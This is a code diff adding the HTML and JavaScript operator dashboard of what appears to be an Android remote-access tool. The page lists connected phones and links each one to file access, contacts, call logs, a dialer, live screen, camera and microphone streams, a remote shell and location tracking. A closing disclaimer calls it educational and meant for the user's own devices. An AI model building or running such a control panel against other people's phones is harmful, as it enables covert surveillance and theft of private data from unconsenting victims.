@@ -1,0 +1,185 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Remote Access Dashboard</title>
+  <link rel="stylesheet" href="/css/hacker-theme.css">
+</head>
+
+<body>
+  <div class="container">
+    <header>
+      <h1>Remote Access Dashboard</h1>
+      <div style="display:flex;align-items:center;gap:16px;">
+        <div class="conn-status">
+          <span class="conn-dot" id="conn-dot"></span>
+          <span id="conn-label">checking...</span>
+        </div>
+        <a href="/auth/logout" class="btn btn-secondary"
+          style="padding:6px 14px;font-size:12px;text-decoration:none;">LOGOUT</a>
+      </div>
+    </header>
+
+    <div class="stats" id="stats">
+      <div class="stat-card">
+        <h3 id="device-count">0</h3>
+        <p>Devices Online</p>
+      </div>
+      <div class="stat-card">
+        <h3 id="uptime">0s</h3>
+        <p>Server Uptime</p>
+      </div>
+      <div class="stat-card">
+        <h3 id="last-refresh">--:--</h3>
+        <p>Last Refresh</p>
+      </div>
+    </div>
+
+    <div id="devices-container" class="loading">
+      Initializing connection...
+    </div>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    let devices = [];
+    const connDot = document.getElementById('conn-dot');
+    const connLabel = document.getElementById('conn-label');
+
+    function updateConnectionStatus(online) {
+      connDot.className = 'conn-dot ' + (online ? 'online' : 'offline');
+      connLabel.textContent = online ? 'server online' : 'server offline';
+    }
+
+    async function loadDevices() {
+      try {
+        const response = await api.getDevices();
+        devices = response.devices;
+
+        document.getElementById('device-count').textContent = devices.length;
+        document.getElementById('last-refresh').textContent = new Date().toLocaleTimeString();
+        updateConnectionStatus(true);
+        renderDevices();
+      } catch (error) {
+        console.error('Failed to load devices:', error);
+        updateConnectionStatus(false);
+        document.getElementById('devices-container').innerHTML = `
+          <div class="empty-state">
+            <h2>&#x26A0; Connection Error</h2>
+            <p>${error.message}</p>
+            <p style="margin-top:12px;"><button class="btn btn-primary" onclick="loadDevices()">RETRY</button></p>
+          </div>
+        `;
+      }
+    }
+
+    async function loadStats() {
+      try {
+        const response = await api.request('/stats');
+        const uptime = Math.floor(response.stats.uptime);
+        const hours = Math.floor(uptime / 3600);
+        const minutes = Math.floor((uptime % 3600) / 60);
+        const seconds = uptime % 60;
+
+        document.getElementById('uptime').textContent =
+          hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m ${seconds}s`;
+      } catch (error) {
+        console.error('Failed to load stats:', error);
+      }
+    }
+
+    function renderDevices() {
+      const container = document.getElementById('devices-container');
+
+      if (devices.length === 0) {
+        container.className = '';
+        container.innerHTML = `
+          <div class="empty-state">
+            <h2>No Devices Connected</h2>
+            <p>Waiting for device connection...</p>
+          </div>
+        `;
+        return;
+      }
+
+      container.className = 'devices-grid';
+      container.innerHTML = devices.map(device => `
+        <div class="device-card">
+          <div class="device-header">
+            <div class="device-icon">&#x1F4F1;</div>
+            <div class="device-info">
+              <h3>${device.model || 'Unknown Device'}</h3>
+              <p><span class="status-badge status-online">&#x25CF; ONLINE</span></p>
+            </div>
+          </div>
+          
+          <div class="device-details">
+            <div class="detail-row">
+              <span class="detail-label">Device ID</span>
+              <span class="detail-value">${device.deviceId.substring(0, 8)}...</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">Android</span>
+              <span class="detail-value">${device.androidVersion || 'N/A'}</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">Battery</span>
+              <span class="detail-value">${device.battery || 'N/A'}%</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">Connected</span>
+              <span class="detail-value">${new Date(device.connectedAt).toLocaleTimeString()}</span>
+            </div>
+          </div>
+
+          <div class="device-actions">
+            <a href="device-info.html?deviceId=${device.deviceId}" class="btn btn-primary">INFO</a>
+            <a href="file-manager.html?deviceId=${device.deviceId}" class="btn btn-secondary">FILES</a>
+            <a href="apps.html?deviceId=${device.deviceId}" class="btn btn-secondary">APPS</a>
+            <a href="contacts.html?deviceId=${device.deviceId}" class="btn btn-secondary">CONTACTS</a>
+            <a href="calls.html?deviceId=${device.deviceId}" class="btn btn-secondary">LOGS</a>
+            <a href="dialer.html?deviceId=${device.deviceId}" class="btn btn-secondary">DIALER</a>
+            <a href="screen-stream.html?deviceId=${device.deviceId}" class="btn btn-secondary">SCREEN</a>
+            <a href="cam-stream.html?deviceId=${device.deviceId}" class="btn btn-secondary">CAMERA</a>
+            <a href="mic-stream.html?deviceId=${device.deviceId}" class="btn btn-secondary">MIC</a>
+            <a href="shell.html?deviceId=${device.deviceId}" class="btn btn-secondary">SHELL</a>
+            <a href="location.html?deviceId=${device.deviceId}" class="btn btn-secondary">LOCATION</a>
+            <a href="speak.html?deviceId=${device.deviceId}" class="btn btn-secondary">SPEAK</a>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    // Initial load
+    loadDevices();
+    loadStats();
+
+    // Auto-refresh every 5 seconds
+    setInterval(() => {
+      loadDevices();
+      loadStats();
+    }, 5000);
+  </script>
+
+  <!-- Disclaimer -->
+  <div class="container">
+    <div class="disclaimer">
+      <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+      <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely manage
+        their own devices. Installing or using this application on a device without the owner's explicit consent is
+        illegal and unethical. The developers assume no liability for misuse. By using this application, you agree that
+        you are solely responsible for how it is used.</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <p class="footer-created">Created by</p>
+    <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+    <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+  </footer>
+</body>
+
+</html>
